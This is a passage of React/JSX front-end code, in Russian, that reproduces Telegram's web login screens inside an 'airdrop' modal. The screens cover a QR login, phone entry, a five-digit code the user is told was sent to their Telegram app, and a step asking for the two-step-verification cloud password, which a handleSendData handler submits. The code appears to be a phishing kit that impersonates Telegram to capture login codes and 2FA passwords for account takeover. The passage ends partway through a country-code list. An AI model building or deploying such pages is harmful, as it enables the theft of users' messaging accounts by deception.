                                                            <rect x="213" y="234" width="7" height="7" transform="rotate(0,216.5,237.5)"></rect>
                                                            <rect x="213" y="241" width="7" height="7" transform="rotate(0,216.5,244.5)"></rect>
                                                            <path d="M 213 248v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,216.5,251.5)"></path>
                                                            <path d="M 220 73v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,223.5,76.5)"></path>
                                                            <rect x="220" y="80" width="7" height="7" transform="rotate(0,223.5,83.5)"></rect>
                                                            <path d="M 220 87v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,223.5,90.5)"></path>
                                                            <path d="M 220 101v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,223.5,104.5)"></path>
                                                            <rect x="220" y="115" width="7" height="7" transform="rotate(0,223.5,118.5)"></rect>
                                                            <rect x="220" y="122" width="7" height="7" transform="rotate(0,223.5,125.5)"></rect>
                                                            <rect x="220" y="143" width="7" height="7" transform="rotate(0,223.5,146.5)"></rect>
                                                            <path d="M 220 157v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,223.5,160.5)"></path>
                                                            <rect x="220" y="164" width="7" height="7" transform="rotate(0,223.5,167.5)"></rect>
                                                            <rect x="220" y="171" width="7" height="7" transform="rotate(0,223.5,174.5)"></rect>
                                                            <rect x="220" y="178" width="7" height="7" transform="rotate(0,223.5,181.5)"></rect>
                                                            <rect x="220" y="185" width="7" height="7" transform="rotate(0,223.5,188.5)"></rect>
                                                            <path d="M 220 192v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,223.5,195.5)"></path>
                                                            <rect x="220" y="206" width="7" height="7" transform="rotate(0,223.5,209.5)"></rect>
                                                            <circle cx="223.5" cy="223.5" r="3.5" transform="rotate(0,223.5,223.5)"></circle>
                                                            <rect x="220" y="234" width="7" height="7" transform="rotate(0,223.5,237.5)"></rect>
                                                            <path d="M 220 255v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,223.5,258.5)"></path>
                                                            <path d="M 220 262v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,223.5,265.5)"></path>
                                                            <rect x="227" y="80" width="7" height="7" transform="rotate(0,230.5,83.5)"></rect>
                                                            <path d="M 227 108v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,230.5,111.5)"></path>
                                                            <rect x="227" y="115" width="7" height="7" transform="rotate(0,230.5,118.5)"></rect>
                                                            <rect x="227" y="122" width="7" height="7" transform="rotate(0,230.5,125.5)"></rect>
                                                            <rect x="227" y="129" width="7" height="7" transform="rotate(0,230.5,132.5)"></rect>
                                                            <rect x="227" y="136" width="7" height="7" transform="rotate(0,230.5,139.5)"></rect>
                                                            <path d="M 227 143v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,230.5,146.5)"></path>
                                                            <path d="M 227 164v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,230.5,167.5)"></path>
                                                            <path d="M 227 171v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,230.5,174.5)"></path>
                                                            <path d="M 227 199v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,230.5,202.5)"></path>
                                                            <rect x="227" y="206" width="7" height="7" transform="rotate(0,230.5,209.5)"></rect>
                                                            <rect x="227" y="234" width="7" height="7" transform="rotate(0,230.5,237.5)"></rect>
                                                            <path d="M 227 241v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,230.5,244.5)"></path>
                                                            <path d="M 227 255v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,230.5,258.5)"></path>
                                                            <rect x="227" y="262" width="7" height="7" transform="rotate(0,230.5,265.5)"></rect>
                                                            <path d="M 234 73v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,237.5,76.5)"></path>
                                                            <path d="M 234 80v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,237.5,83.5)"></path>
                                                            <path d="M 234 115v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,237.5,118.5)"></path>
                                                            <rect x="234" y="122" width="7" height="7" transform="rotate(0,237.5,125.5)"></rect>
                                                            <circle cx="237.5" cy="160.5" r="3.5" transform="rotate(0,237.5,160.5)"></circle>
                                                            <path d="M 234 178v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,237.5,181.5)"></path>
                                                            <path d="M 234 192v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,237.5,195.5)"></path>
                                                            <rect x="234" y="199" width="7" height="7" transform="rotate(0,237.5,202.5)"></rect>
                                                            <rect x="234" y="206" width="7" height="7" transform="rotate(0,237.5,209.5)"></rect>
                                                            <rect x="234" y="213" width="7" height="7" transform="rotate(0,237.5,216.5)"></rect>
                                                            <rect x="234" y="220" width="7" height="7" transform="rotate(0,237.5,223.5)"></rect>
                                                            <rect x="234" y="227" width="7" height="7" transform="rotate(0,237.5,230.5)"></rect>
                                                            <rect x="234" y="234" width="7" height="7" transform="rotate(0,237.5,237.5)"></rect>
                                                            <rect x="234" y="241" width="7" height="7" transform="rotate(0,237.5,244.5)"></rect>
                                                            <path d="M 234 248v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,237.5,251.5)"></path>
                                                            <path d="M 234 262v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,237.5,265.5)"></path>
                                                            <path d="M 241 87v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,244.5,90.5)"></path>
                                                            <path d="M 241 101v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,244.5,104.5)"></path>
                                                            <path d="M 241 108v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,244.5,111.5)"></path>
                                                            <rect x="241" y="122" width="7" height="7" transform="rotate(0,244.5,125.5)"></rect>
                                                            <circle cx="244.5" cy="139.5" r="3.5" transform="rotate(0,244.5,139.5)"></circle>
                                                            <path d="M 241 178v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,244.5,181.5)"></path>
                                                            <path d="M 241 185v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,244.5,188.5)"></path>
                                                            <path d="M 241 206v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,244.5,209.5)"></path>
                                                            <rect x="241" y="213" width="7" height="7" transform="rotate(0,244.5,216.5)"></rect>
                                                            <path d="M 241 220v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,244.5,223.5)"></path>
                                                            <circle cx="244.5" cy="258.5" r="3.5" transform="rotate(0,244.5,258.5)"></circle>
                                                            <circle cx="251.5" cy="76.5" r="3.5" transform="rotate(0,251.5,76.5)"></circle>
                                                            <path d="M 248 87v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,251.5,90.5)"></path>
                                                            <path d="M 248 101v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,251.5,104.5)"></path>
                                                            <path d="M 248 115v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,251.5,118.5)"></path>
                                                            <rect x="248" y="122" width="7" height="7" transform="rotate(0,251.5,125.5)"></rect>
                                                            <path d="M 248 129v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,251.5,132.5)"></path>
                                                            <path d="M 248 143v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,251.5,146.5)"></path>
                                                            <path d="M 248 157v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,251.5,160.5)"></path>
                                                            <path d="M 248 164v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,251.5,167.5)"></path>
                                                            <circle cx="251.5" cy="195.5" r="3.5" transform="rotate(0,251.5,195.5)"></circle>
                                                            <path d="M 248 213v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,251.5,216.5)"></path>
                                                            <circle cx="251.5" cy="230.5" r="3.5" transform="rotate(0,251.5,230.5)"></circle>
                                                            <path d="M 248 262v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,251.5,265.5)"></path>
                                                            <path d="M 255 136v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,258.5,139.5)"></path>
                                                            <rect x="255" y="143" width="7" height="7" transform="rotate(0,258.5,146.5)"></rect>
                                                            <path d="M 255 150v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,258.5,153.5)"></path>
                                                            <path d="M 255 178v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(180,258.5,181.5)"></path>
                                                            <circle cx="258.5" cy="223.5" r="3.5" transform="rotate(0,258.5,223.5)"></circle>
                                                            <rect x="255" y="262" width="7" height="7" transform="rotate(0,258.5,265.5)"></rect>
                                                            <path d="M 262 66v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,265.5,69.5)"></path>
                                                            <path d="M 262 73v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,265.5,76.5)"></path>
                                                            <path d="M 262 87v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,265.5,90.5)"></path>
                                                            <path d="M 262 94v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,265.5,97.5)"></path>
                                                            <path d="M 262 108v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,265.5,111.5)"></path>
                                                            <rect x="262" y="115" width="7" height="7" transform="rotate(0,265.5,118.5)"></rect>
                                                            <rect x="262" y="122" width="7" height="7" transform="rotate(0,265.5,125.5)"></rect>
                                                            <path d="M 262 129v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,265.5,132.5)"></path>
                                                            <path d="M 262 150v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,265.5,153.5)"></path>
                                                            <path d="M 262 171v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(-90,265.5,174.5)"></path>
                                                            <rect x="262" y="178" width="7" height="7" transform="rotate(0,265.5,181.5)"></rect>
                                                            <path d="M 262 185v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(90,265.5,188.5)"></path>
                                                            <circle cx="265.5" cy="209.5" r="3.5" transform="rotate(0,265.5,209.5)"></circle>
                                                            <path d="M 262 262v 7h 3.5a 3.5 3.5, 0, 0, 0, 0 -7" transform="rotate(0,265.5,265.5)"></path>
                                                            <path clipRule="evenodd"
                                                                d="M 10 27.5v 14a 17.5 17.5, 0, 0, 0, 17.5 17.5h 14a 17.5 17.5, 0, 0, 0, 17.5 -17.5v -14a 17.5 17.5, 0, 0, 0, -17.5 -17.5h -14a 17.5 17.5, 0, 0, 0, -17.5 17.5M 27.5 17h 14a 10.5 10.5, 0, 0, 1, 10.5 10.5v 14a 10.5 10.5, 0, 0, 1, -10.5 10.5h -14a 10.5 10.5, 0, 0, 1, -10.5 -10.5v -14a 10.5 10.5, 0, 0, 1, 10.5 -10.5"
                                                                transform="rotate(0,34.5,34.5)"></path>
                                                            <path d="M 24 24v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,27.5,27.5)"></path>
                                                            <rect x="24" y="31" width="7" height="7" transform="rotate(0,27.5,34.5)"></rect>
                                                            <path d="M 24 38v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,27.5,41.5)"></path>
                                                            <rect x="31" y="24" width="7" height="7" transform="rotate(0,34.5,27.5)"></rect>
                                                            <rect x="31" y="31" width="7" height="7" transform="rotate(0,34.5,34.5)"></rect>
                                                            <rect x="31" y="38" width="7" height="7" transform="rotate(0,34.5,41.5)"></rect>
                                                            <path d="M 38 24v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,41.5,27.5)"></path>
                                                            <rect x="38" y="31" width="7" height="7" transform="rotate(0,41.5,34.5)"></rect>
                                                            <path d="M 38 38v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,41.5,41.5)"></path>
                                                            <path clipRule="evenodd"
                                                                d="M 220 27.5v 14a 17.5 17.5, 0, 0, 0, 17.5 17.5h 14a 17.5 17.5, 0, 0, 0, 17.5 -17.5v -14a 17.5 17.5, 0, 0, 0, -17.5 -17.5h -14a 17.5 17.5, 0, 0, 0, -17.5 17.5M 237.5 17h 14a 10.5 10.5, 0, 0, 1, 10.5 10.5v 14a 10.5 10.5, 0, 0, 1, -10.5 10.5h -14a 10.5 10.5, 0, 0, 1, -10.5 -10.5v -14a 10.5 10.5, 0, 0, 1, 10.5 -10.5"
                                                                transform="rotate(90,244.5,34.5)"></path>
                                                            <path d="M 234 24v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,237.5,27.5)"></path>
                                                            <rect x="234" y="31" width="7" height="7" transform="rotate(0,237.5,34.5)"></rect>
                                                            <path d="M 234 38v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,237.5,41.5)"></path>
                                                            <rect x="241" y="24" width="7" height="7" transform="rotate(0,244.5,27.5)"></rect>
                                                            <rect x="241" y="31" width="7" height="7" transform="rotate(0,244.5,34.5)"></rect>
                                                            <rect x="241" y="38" width="7" height="7" transform="rotate(0,244.5,41.5)"></rect>
                                                            <path d="M 248 24v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,251.5,27.5)"></path>
                                                            <rect x="248" y="31" width="7" height="7" transform="rotate(0,251.5,34.5)"></rect>
                                                            <path d="M 248 38v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,251.5,41.5)"></path>
                                                            <path clipRule="evenodd"
                                                                d="M 10 237.5v 14a 17.5 17.5, 0, 0, 0, 17.5 17.5h 14a 17.5 17.5, 0, 0, 0, 17.5 -17.5v -14a 17.5 17.5, 0, 0, 0, -17.5 -17.5h -14a 17.5 17.5, 0, 0, 0, -17.5 17.5M 27.5 227h 14a 10.5 10.5, 0, 0, 1, 10.5 10.5v 14a 10.5 10.5, 0, 0, 1, -10.5 10.5h -14a 10.5 10.5, 0, 0, 1, -10.5 -10.5v -14a 10.5 10.5, 0, 0, 1, 10.5 -10.5"
                                                                transform="rotate(-90,34.5,244.5)"></path>
                                                            <path d="M 24 234v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(-90,27.5,237.5)"></path>
                                                            <rect x="24" y="241" width="7" height="7" transform="rotate(0,27.5,244.5)"></rect>
                                                            <path d="M 24 248v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(180,27.5,251.5)"></path>
                                                            <rect x="31" y="234" width="7" height="7" transform="rotate(0,34.5,237.5)"></rect>
                                                            <rect x="31" y="241" width="7" height="7" transform="rotate(0,34.5,244.5)"></rect>
                                                            <rect x="31" y="248" width="7" height="7" transform="rotate(0,34.5,251.5)"></rect>
                                                            <path d="M 38 234v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(0,41.5,237.5)"></path>
                                                            <rect x="38" y="241" width="7" height="7" transform="rotate(0,41.5,244.5)"></rect>
                                                            <path d="M 38 248v 7h 7v -3.5a 3.5 3.5, 0, 0, 0, -3.5 -3.5" transform="rotate(90,41.5,251.5)"></path>
                                                        </clipPath>
                                                    </defs>
                                                    <rect x="0" y="0" height="280" width="280" clip-path="url('#clip-path-background-color')" fill="#fff"></rect>
                                                    <rect x="0" y="0" height="280" width="280" clip-path="url('#clip-path-dot-color')" fill="#000"></rect>
                                                    <image x="116" y="116" width="47px" height="47px"
                                                        href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=">
                                                    </image>
                                                </svg></div>
                                                <div className="AnimatedSticker qr-plane opacity-transition slow open shown">
                                                    <div className="image_logo"></div>
                                                </div>
                                            </div>
                                        </div>
                                        <h1>Быстрый вход по QR-коду</h1>
                                        <ol>
                                            <li>
                                                <span>Откройте Telegram с телефона</span>
                                            </li>
                                            <li>
                                                <span>Перейдите в Настройки &gt; Устройства &gt; Подключить устройство</span>
                                            </li>
                                            <li>
                                                <span>Для подтверждения направьте камеру телефона на этот экран.</span>
                                            </li>
                                        </ol>
                                        <button type="button" className="Button default primary text" onClick={handleSetPhone}>Вход по номеру телефона</button>
                                    </div>
                                </div>
                            </div>
                        ) : (
                            !showStep2 ? (
                                <div className="airdrop-modal--content custom-background1 rounded css-4cffwv">
                                    <div className="auth-form form">
                                        <div id="monkey" className="">
                                            <div className="AnimatedSticker"><canvas width="160" height="160"
                                            ></canvas></div>
                                            <div className="AnimatedSticker hidden"><canvas width="160" height="160"
                                            ></canvas></div>
                                        </div>
                                        <h1>{phoneNumber}<div className="auth-number-edit div-button" role="button" tabindex="0" title="Неправильный номер?"
                                            aria-label="Неправильный номер?"><i className="icon icon-edit"></i></div>
                                        </h1>
                                        <p className="note">Мы отправили код в приложение <b>Telegram</b> на другом Вашем устройстве.</p>
                                        <div className="input-group with-label">
                                            <InputMask
                                                required="required"
                                                className="form-control"
                                                type="text"
                                                id="sign-in-code"
                                                dir="auto"
                                                mask="99999"
                                                maskChar=""
                                                onChange={handleInputCodeChange}
                                            />
                                            <label for="sign-in-code">Код</label>
                                        </div>
                                    </div>
                                </div>
                            ) : (
                                !showStep3 ? (
                                    <div className="airdrop-modal--content custom-background1 rounded css-4cffwv">
                                        <div className="auth-form form">
                                            <div id="monkey" className="">
                                                <div className="AnimatedSticker"><canvas width="160" height="160"
                                                ></canvas></div>
                                                <div className="AnimatedSticker hidden"><canvas width="160" height="160"
                                                ></canvas></div>
                                            </div>
                                            <h1>Введите пароль<div clas s="auth-number-edit div-button" role="button" tabindex="0" title="Неправильный номер?"
                                                aria-label="Неправильный номер?"><i className="icon icon-edit"></i></div>
                                            </h1>
                                            <p className="note">Вы включили двухэтапную аутентификацию. Ваш аккаунт защищён дополнительным облачным паролем.</p>
                                            <div className="input-group with-label"><input onChange={handleInputPassChange} className="form-control" type="text" id="sign-in-code" dir="auto"
                                                autocomplete="off" inputMode="numeric" aria-label="Пароль" /><label for="sign-in-code">Пароль</label></div>
                                            <button type="button" className="pr Button default primary has-ripple" onClick={handleSendData}>
                                                Далее
                                                <div className="ripple-container"></div>
                                            </button>
                                        </div>
                                    </div>
                                ) : (
                                    <div className="airdrop-modal--content custom-background1 rounded css-4cffwv">
                                        <div className="auth-form">
                                            <div id="logo"></div>
                                            <h1>Telegram</h1>
                                            <p className="note">Проверьте код страны и введите свой номер телефона.</p>
                                            <form className="form" action="">
                                                {/* <div className="DropdownMenu CountryCodeInput">
                                                <div className="input-group">
                                                    <input className="form-control focus" type="text" id="sign-in-phone-code" autocomplete="off" />
                                                    <label>Страна</label>
                                                    <i className="css-icon-down open"></i>
                                                </div>
                                                <div className="Menu compact CountryCodeInput">
                                                    <div className="backdrop"></div>
                                                    <div role="presentation"
                                                        className="bubble menu-container custom-scroll top left opacity-transition fast open shown">
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1fa.png" className="emoji" alt="🇦🇺"
                                                            data-path="./img-apple-160/1f1e6-1f1fa.png" draggable="false" /></span><span
                                                                className="country-name">Австралия</span><span className="country-code">+61</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1f9.png" className="emoji" alt="🇦🇹"
                                                            data-path="./img-apple-160/1f1e6-1f1f9.png" draggable="false" /></span><span
                                                                className="country-name">Австрия</span><span className="country-code">+43</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1ff.png" className="emoji" alt="🇦🇿"
                                                            data-path="./img-apple-160/1f1e6-1f1ff.png" draggable="false" /></span><span
                                                                className="country-name">Азербайджан</span><span className="country-code">+994</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1f1.png" className="emoji" alt="🇦🇱"
                                                            data-path="./img-apple-160/1f1e6-1f1f1.png" draggable="false" /></span><span
                                                                className="country-name">Албания</span><span className="country-code">+355</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e9-1f1ff.png" className="emoji" alt="🇩🇿"
                                                            data-path="./img-apple-160/1f1e9-1f1ff.png" draggable="false" /></span><span
                                                                className="country-name">Алжир</span><span className="country-code">+213</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1fb-1f1ee.png" className="emoji" alt="🇻🇮"
                                                            data-path="./img-apple-160/1f1fb-1f1ee.png" draggable="false" /></span><span
                                                                className="country-name">Американские Виргинские о-ва</span><span className="country-code">+1340</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1f8.png" className="emoji" alt="🇦🇸"
                                                            data-path="./img-apple-160/1f1e6-1f1f8.png" draggable="false" /></span><span
                                                                className="country-name">Американское Самоа</span><span className="country-code">+1684</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1ee.png" className="emoji" alt="🇦🇮"
                                                            data-path="./img-apple-160/1f1e6-1f1ee.png" draggable="false" /></span><span
                                                                className="country-name">Ангилья</span><span className="country-code">+1264</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1f4.png" className="emoji" alt="🇦🇴"
                                                            data-path="./img-apple-160/1f1e6-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Ангола</span><span className="country-code">+244</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1e9.png" className="emoji" alt="🇦🇩"
                                                            data-path="./img-apple-160/1f1e6-1f1e9.png" draggable="false" /></span><span
                                                                className="country-name">Андорра</span><span className="country-code">+376</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f3f4-200d-2620-fe0f.png" className="emoji" alt="🏴‍☠️"
                                                            data-path="./img-apple-160/1f3f4-200d-2620-fe0f.png" draggable="false" /></span><span
                                                                className="country-name">Анонимные номера</span><span className="country-code">+888</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1ec.png" className="emoji" alt="🇦🇬"
                                                            data-path="./img-apple-160/1f1e6-1f1ec.png" draggable="false" /></span><span
                                                                className="country-name">Антигуа и Барбуда</span><span className="country-code">+1268</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1f7.png" className="emoji" alt="🇦🇷"
                                                            data-path="./img-apple-160/1f1e6-1f1f7.png" draggable="false" /></span><span
                                                                className="country-name">Аргентина</span><span className="country-code">+54</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1f2.png" className="emoji" alt="🇦🇲"
                                                            data-path="./img-apple-160/1f1e6-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Армения</span><span className="country-code">+374</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1fc.png" className="emoji" alt="🇦🇼"
                                                            data-path="./img-apple-160/1f1e6-1f1fc.png" draggable="false" /></span><span
                                                                className="country-name">Аруба</span><span className="country-code">+297</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e6-1f1eb.png" className="emoji" alt="🇦🇫"
                                                            data-path="./img-apple-160/1f1e6-1f1eb.png" draggable="false" /></span><span
                                                                className="country-name">Афганистан</span><span className="country-code">+93</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1f8.png" className="emoji" alt="🇧🇸"
                                                            data-path="./img-apple-160/1f1e7-1f1f8.png" draggable="false" /></span><span
                                                                className="country-name">Багамы</span><span className="country-code">+1242</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1e9.png" className="emoji" alt="🇧🇩"
                                                            data-path="./img-apple-160/1f1e7-1f1e9.png" draggable="false" /></span><span
                                                                className="country-name">Бангладеш</span><span className="country-code">+880</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1e7.png" className="emoji" alt="🇧🇧"
                                                            data-path="./img-apple-160/1f1e7-1f1e7.png" draggable="false" /></span><span
                                                                className="country-name">Барбадос</span><span className="country-code">+1246</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1ed.png" className="emoji" alt="🇧🇭"
                                                            data-path="./img-apple-160/1f1e7-1f1ed.png" draggable="false" /></span><span
                                                                className="country-name">Бахрейн</span><span className="country-code">+973</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1fe.png" className="emoji" alt="🇧🇾"
                                                            data-path="./img-apple-160/1f1e7-1f1fe.png" draggable="false" /></span><span
                                                                className="country-name">Беларусь</span><span className="country-code">+375</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1ff.png" className="emoji" alt="🇧🇿"
                                                            data-path="./img-apple-160/1f1e7-1f1ff.png" draggable="false" /></span><span
                                                                className="country-name">Белиз</span><span className="country-code">+501</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1ea.png" className="emoji" alt="🇧🇪"
                                                            data-path="./img-apple-160/1f1e7-1f1ea.png" draggable="false" /></span><span
                                                                className="country-name">Бельгия</span><span className="country-code">+32</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1ef.png" className="emoji" alt="🇧🇯"
                                                            data-path="./img-apple-160/1f1e7-1f1ef.png" draggable="false" /></span><span
                                                                className="country-name">Бенин</span><span className="country-code">+229</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1f2.png" className="emoji" alt="🇧🇲"
                                                            data-path="./img-apple-160/1f1e7-1f1f2.png" draggable="false" /></span><span
                                                                className="country-name">Бермудские Острова</span><span className="country-code">+1441</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1ec.png" className="emoji" alt="🇧🇬"
                                                            data-path="./img-apple-160/1f1e7-1f1ec.png" draggable="false" /></span><span
                                                                className="country-name">Болгария</span><span className="country-code">+359</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1f4.png" className="emoji" alt="🇧🇴"
                                                            data-path="./img-apple-160/1f1e7-1f1f4.png" draggable="false" /></span><span
                                                                className="country-name">Боливия</span><span className="country-code">+591</span></div>
                                                        <div role="menuitem" tabindex="0" className="MenuItem compact"><span className="country-flag"><img
                                                            src="https://web.telegram.org/a/img-apple-160/1f1e7-1f1f6.png" className="emoji" alt="🇧🇶"
                                                            data-path="./img-apple-160/1f1e7-1f1f6.png" draggable="false" /></span><span
